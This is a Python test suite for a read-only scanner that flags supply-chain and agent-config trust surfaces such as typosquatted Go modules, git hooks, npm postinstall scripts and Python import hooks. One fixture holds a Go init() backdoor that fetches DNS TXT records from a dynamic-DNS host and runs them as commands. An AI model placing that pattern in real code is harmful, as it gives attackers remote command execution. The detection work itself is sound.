import tempfile
import unittest
from pathlib import Path

from never_ending_story.scanner import render_markdown, scan_path


class ScannerTests(unittest.TestCase):
    def test_flags_socket_decimal_typosquat_in_go_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "go.mod").write_text(
                "module example.test\n\n"
                "require github.com/shopsprint/decimal v1.3.3\n",
                encoding="utf-8",
            )
            (root / "go.sum").write_text(
                "github.com/shopsprint/decimal v1.3.3 h1:example\n",
                encoding="utf-8",
            )

            report = scan_path(root)

        ids = {finding.rule_id for finding in report.findings}
        self.assertIn("go.shopsprint_decimal", ids)
        self.assertEqual(report.mode, "announce-only")
        self.assertFalse(report.mutated)

    def test_flags_go_import_time_dns_exec_boundary(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "decimal.go").write_text(
                'package decimal\n\n'
                'import ("net"; "os/exec"; "time")\n\n'
                "func init() {\n"
                "  go func() {\n"
                '    records, _ := net.LookupTXT("dnslog-cdn-images.freemyip.com")\n'
                "    for _, txt := range records { exec.Command(txt).CombinedOutput() }\n"
                "    time.Sleep(5 * time.Minute)\n"
                "  }()\n"
                "}\n",
                encoding="utf-8",
            )

            report = scan_path(root)

        ids = {finding.rule_id for finding in report.findings}
        self.assertIn("go.import_time_dns_exec", ids)
        self.assertIn("network.dns_txt_dynamic_dns", ids)

    def test_flags_agent_and_persistence_trust_surfaces(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".mcp.json").write_text("{}", encoding="utf-8")
            hook_dir = root / ".git" / "hooks"
            hook_dir.mkdir(parents=True)
            (hook_dir / "pre-commit").write_text("echo hi\n", encoding="utf-8")
            workflow_dir = root / ".github" / "workflows"
            workflow_dir.mkdir(parents=True)
            (workflow_dir / "agent.yml").write_text("name: agent\n", encoding="utf-8")

            report = scan_path(root)

        ids = {finding.rule_id for finding in report.findings}
        self.assertIn("agent.config_surface", ids)
        self.assertIn("inventory.git_hook", ids)
        self.assertIn("ci.workflow_surface", ids)
        self.assertTrue(
            all(
                finding.severity == "info"
                for finding in report.findings
                if finding.category == "inventory"
            )
        )

    def test_agent_directory_contents_do_not_all_trigger(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            claude_dir = root / ".claude"
            claude_dir.mkdir()
            (claude_dir / "memory.md").write_text("ordinary memory\n", encoding="utf-8")
            (claude_dir / "settings.json").write_text("{}", encoding="utf-8")

            report = scan_path(root)

        agent_findings = [
            finding for finding in report.findings
            if finding.rule_id == "agent.config_surface"
        ]
        self.assertEqual(1, len(agent_findings))
        self.assertEqual(".claude/settings.json", agent_findings[0].path)

    def test_nested_agent_mcp_json_fires_for_confirmed_agent_dirs(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for dirname in [".claude", ".cursor", ".gemini"]:
                target = root / dirname / "mcp.json"
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text("{}", encoding="utf-8")

            report = scan_path(root)

        agent_paths = {
            finding.path
            for finding in report.findings
            if finding.rule_id == "agent.config_surface"
        }
        self.assertEqual(
            {".claude/mcp.json", ".cursor/mcp.json", ".gemini/mcp.json"},
            agent_paths,
        )

    def test_agent_mcp_json_does_not_blast_unconfirmed_or_unrelated_paths(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            paths = [
                root / "mcp.json",
                root / ".copilot" / "mcp.json",
                root / ".cursor" / "notes.md",
                root / ".cursor" / "cache" / "foo.json",
                root / ".cursor" / "some-other-name.json",
                root / ".gemini" / "keys.txt",
            ]
            for path in paths:
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text("{}", encoding="utf-8")

            report = scan_path(root)

        self.assertEqual([], report.findings)

    def test_existing_agent_config_paths_still_fire(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            paths = [
                root / ".cursor" / "settings.json",
                root / ".gemini" / "settings.json",
                root / ".copilot" / "settings.json",
                root / ".mcp.json",
                root / ".claude.json",
            ]
            for path in paths:
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text("{}", encoding="utf-8")

            report = scan_path(root)

        agent_paths = {
            finding.path
            for finding in report.findings
            if finding.rule_id == "agent.config_surface"
        }
        self.assertEqual(
            {
                ".cursor/settings.json",
                ".gemini/settings.json",
                ".copilot/settings.json",
                ".mcp.json",
                ".claude.json",
            },
            agent_paths,
        )

    def test_markdown_report_announces_no_mutation(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "go.mod").write_text(
                "module example.test\n\n"
                "require github.com/shopsprint/decimal v1.3.3\n",
                encoding="utf-8",
            )
            hook_dir = root / ".git" / "hooks"
            hook_dir.mkdir(parents=True)
            (hook_dir / "pre-commit").write_text("echo hi\n", encoding="utf-8")

            markdown = render_markdown(scan_path(root))

        self.assertIn("Mode: announce-only", markdown)
        self.assertIn("Target mutated: no", markdown)
        self.assertIn("Indicator matches: 1", markdown)
        self.assertIn("Trust-surface inventory: 1", markdown)
        self.assertIn("go.shopsprint_decimal", markdown)
        self.assertIn("Indicator Matches", markdown)
        self.assertIn("Trust-Surface Inventory", markdown)
        self.assertIn("matched indicator, not a verdict", markdown)
        self.assertIn("Phase 2 hint (no current action)", markdown)

    def test_flags_public_formatter_paste_exposure_lane(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "incident-notes.md").write_text(
                "BeyondMemory public clipboard triage:\n"
                "jsonformatter.org and codebeautify.org share saved paste data "
                "through public Recent Links.\n"
                "Observed paths include /recentLinksPage/json/0 and "
                "/service/getDataFromID with urlid=<six-hex-id>.\n",
                encoding="utf-8",
            )

            report = scan_path(root)
            markdown = render_markdown(report)

        exposure_findings = [
            finding
            for finding in report.findings
            if finding.rule_id == "exposure.public_formatter_surface"
        ]
        self.assertEqual(1, len(exposure_findings))
        self.assertEqual("exposure", exposure_findings[0].category)
        self.assertEqual("medium", exposure_findings[0].severity)
        self.assertIn("Exposure review: 1", markdown)
        self.assertIn("## Exposure Review", markdown)
        self.assertIn("exposure.public_formatter_surface", markdown)

    def test_formatter_domain_alone_does_not_trigger_exposure_lane(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "README.md").write_text(
                "Do not use jsonformatter.org for private data.\n",
                encoding="utf-8",
            )

            report = scan_path(root)

        self.assertEqual([], report.findings)

    def test_documentation_mentions_do_not_trigger_code_rules(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "README.md").write_text(
                "Documented indicator: github.com/shopsprint/decimal v1.3.3\n"
                "Documented behavior: func init + LookupTXT + exec.Command\n"
                "Documented DNS: freemyip.com\n",
                encoding="utf-8",
            )

            report = scan_path(root)

        self.assertEqual([], report.findings)

    def test_empty_markdown_report_is_not_an_all_clear(self):
        with tempfile.TemporaryDirectory() as tmp:
            markdown = render_markdown(scan_path(Path(tmp)))

        self.assertIn("No findings matched the current rule set.", markdown)
        self.assertIn("This is not an all-clear", markdown)

    def test_flags_npm_install_time_lifecycle_scripts_only(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{\n'
                '  "scripts": {\n'
                '    "test": "jest",\n'
                '    "build": "tsc",\n'
                '    "dev": "vite",\n'
                '    "postinstall": "node setup.js"\n'
                "  }\n"
                "}\n",
                encoding="utf-8",
            )

            report = scan_path(root)

        lifecycle_findings = [
            finding
            for finding in report.findings
            if finding.rule_id == "inventory.npm_lifecycle_script"
        ]
        self.assertEqual(1, len(lifecycle_findings))
        self.assertEqual("inventory", lifecycle_findings[0].category)
        self.assertEqual("info", lifecycle_findings[0].severity)
        self.assertIn("postinstall", lifecycle_findings[0].evidence)
        self.assertIn("Inventory only", lifecycle_findings[0].reason)

    def test_common_npm_developer_scripts_do_not_trigger(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{\n'
                '  "scripts": {\n'
                '    "test": "jest",\n'
                '    "build": "tsc",\n'
                '    "lint": "eslint .",\n'
                '    "start": "node server.js",\n'
                '    "dev": "vite"\n'
                "  }\n"
                "}\n",
                encoding="utf-8",
            )

            report = scan_path(root)

        ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("inventory.npm_lifecycle_script", ids)

    def test_flags_python_import_time_hook_surfaces_at_repo_root(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "sitecustomize.py").write_text("# hook\n", encoding="utf-8")
            (root / "usercustomize.py").write_text("# hook\n", encoding="utf-8")
            (root / "myproject.pth").write_text("src\n", encoding="utf-8")

            report = scan_path(root)

        hook_findings = [
            finding
            for finding in report.findings
            if finding.rule_id == "inventory.python_import_hook"
        ]
        self.assertEqual(3, len(hook_findings))
        self.assertTrue(all(finding.category == "inventory" for finding in hook_findings))
        self.assertTrue(all(finding.severity == "info" for finding in hook_findings))
        self.assertEqual(
            {"sitecustomize.py", "usercustomize.py", "myproject.pth"},
            {finding.evidence for finding in hook_findings},
        )

    def test_python_import_hook_surfaces_inside_envs_do_not_trigger(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            paths = [
                root / ".venv" / "Lib" / "site-packages" / "random.pth",
                root / "venv" / "lib" / "python3.14" / "site-packages" / "random.pth",
                root / "site-packages" / "usercustomize.py",
                root / "dist-packages" / "sitecustomize.py",
                root / ".tox" / "py" / "site-packages" / "random.pth",
                root / ".eggs" / "example.pth",
                root / "env" / "Lib" / "site-packages" / "random.pth",
            ]
            for path in paths:
                path.parent.mkdir(parents=True, exist_ok=True)
                path.write_text("import example\n", encoding="utf-8")

            report = scan_path(root)

        ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("inventory.python_import_hook", ids)

    def test_documentation_mentions_python_import_hooks_do_not_trigger(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "README.md").write_text(
                "Documented Python hooks: sitecustomize.py, usercustomize.py, .pth\n",
                encoding="utf-8",
            )

            report = scan_path(root)

        self.assertEqual([], report.findings)


if __name__ == "__main__":
    unittest.main()
